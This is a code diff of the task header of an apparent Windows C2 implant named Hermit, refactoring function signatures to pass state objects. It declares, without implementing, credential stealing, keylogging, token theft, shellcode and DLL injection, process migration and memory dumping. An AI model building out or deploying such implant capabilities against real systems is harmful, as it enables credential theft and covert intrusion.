@@ -2,6 +2,14 @@
 #define HERMIT_CORE_TASK_HPP
 
 #include <winsock2.h>
+
+#include "core/macros.hpp"
+#include "core/state.hpp"
+#include "core/stdout.hpp"
+#include "core/system.hpp"
+#include "core/technique.hpp"
+#include "core/utils.hpp"
+
 #include <ws2tcpip.h>
 #include <windows.h>
 #include <winhttp.h>
@@ -11,7 +19,7 @@
 #include <gdiplus.h>
 #include <iphlpapi.h>
 #include <psapi.h>
-#include <shlwapi.h>
+// #include <shlwapi.h>
 #include <strsafe.h>
 #include <synchapi.h>
 #include <tlhelp32.h>
@@ -19,13 +27,6 @@
 #include <map>
 #include <string>
 #include <vector>
-
-#include "core/macros.hpp"
-#include "core/state.hpp"
-#include "core/stdout.hpp"
-#include "core/system.hpp"
-#include "core/technique.hpp"
-#include "core/utils.hpp"
 
 // For the 'ip' task
 #define MAX_TRIES 3
@@ -90,6 +91,7 @@ namespace Task
             const std::wstring& wUserSID
         );
         std::map<std::wstring, std::vector<std::wstring>> StealCredsFromFiles(
+            State::PSTATE pState,
             const std::wstring& wUserName,
             const std::wstring& wUserSID
         );
@@ -132,34 +134,34 @@ namespace Task
 
     namespace Helper::Token
     {
-        HANDLE GetTokenByPid(DWORD dwPid);
-        BOOL CreateProcessWithStolenToken(HANDLE hToken, LPCWSTR appName);
+        HANDLE GetTokenByPid(Procs::PPROCS pProcs, DWORD dwPid);
+        BOOL CreateProcessWithStolenToken(Procs::PPROCS pProcs, HANDLE hToken, LPCWSTR appName);
     }
 
-    std::wstring Cat(const std::wstring& wFilePath);
-    std::wstring Cd(const std::wstring& wDestDir);
+    std::wstring Cat(State::PSTATE pState, const std::wstring& wFilePath);
+    std::wstring Cd(State::PSTATE pState, const std::wstring& wDestDir);
     std::wstring Connect(State::PSTATE pState, const std::wstring& wListenerURL);
-    std::wstring Cp(const std::wstring& wSrc, const std::wstring& wDest);
-    std::wstring CredsSteal();
+    std::wstring Cp(State::PSTATE pState, const std::wstring& wSrc, const std::wstring& wDest);
+    std::wstring CredsSteal(State::PSTATE pState);
     std::wstring Dll(State::PSTATE pState, const std::wstring& wPid, const std::wstring& wSrc);
     std::wstring Download(State::PSTATE pState, const std::wstring& wSrc, const std::wstring& wDest);
-    std::wstring EnvLs();
-    std::wstring Execute(const std::wstring& wCmd);
+    std::wstring EnvLs(State::PSTATE pState);
+    std::wstring Execute(State::PSTATE pState, const std::wstring& wCmd);
     std::wstring GroupLs();
-    std::wstring History();
+    std::wstring History(State::PSTATE pState);
     std::wstring Ip();
     std::wstring JitterSet(State::PSTATE pState, const std::wstring& wJitter);
     std::wstring KeyLog(const std::wstring& wLogTime);
     std::wstring Kill(State::PSTATE pState);
     std::wstring KillDateSet(State::PSTATE pState, const std::wstring& wKillDate);
-    std::wstring Ls(const std::wstring& wDir);
-    std::wstring Migrate(const std::wstring& wPid);
-    std::wstring Mkdir(const std::wstring& wDir);
+    std::wstring Ls(State::PSTATE pState, const std::wstring& wDir);
+    std::wstring Migrate(State::PSTATE pState, const std::wstring& wPid);
+    std::wstring Mkdir(State::PSTATE pState, const std::wstring& wDir);
     std::wstring Mv(const std::wstring& wSrc, const std::wstring& wDest);
     std::wstring Net();
     std::wstring Procdump(State::PSTATE pState, const std::wstring& wPid);
-    std::wstring Ps();
-    std::wstring PsKill(const std::wstring& wPid);
+    std::wstring PsKill(Procs::PPROCS pProcs, const std::wstring& wPid);
+    std::wstring PsLs(Procs::PPROCS pProcs);
     std::wstring Pwd();
     std::wstring RegSubKeys(const std::wstring& wRootKey, const std::wstring& wSubKey, BOOL bRecursive);
     std::wstring RegValues(const std::wstring& wRootKey, const std::wstring& wSubKey, BOOL bRecursive);
@@ -173,7 +175,7 @@ namespace Task
     std::wstring Shellcode(State::PSTATE pState, const std::wstring& wPid, const std::wstring& wSrc);
     std::wstring SleepSet(State::PSTATE pState, const std::wstring& wSleep);
     std::wstring TokenRevert();
-    std::wstring TokenSteal(const std::wstring& wPid, const std::wstring& wProcName, bool bLogin);
+    std::wstring TokenSteal(State::PSTATE pState, const std::wstring& wPid, const std::wstring& wProcName, bool bLogin);
     std::wstring Upload(State::PSTATE pState, const std::wstring& wSrc, const std::wstring& wDest);
     std::wstring Users();
     std::wstring Whoami();
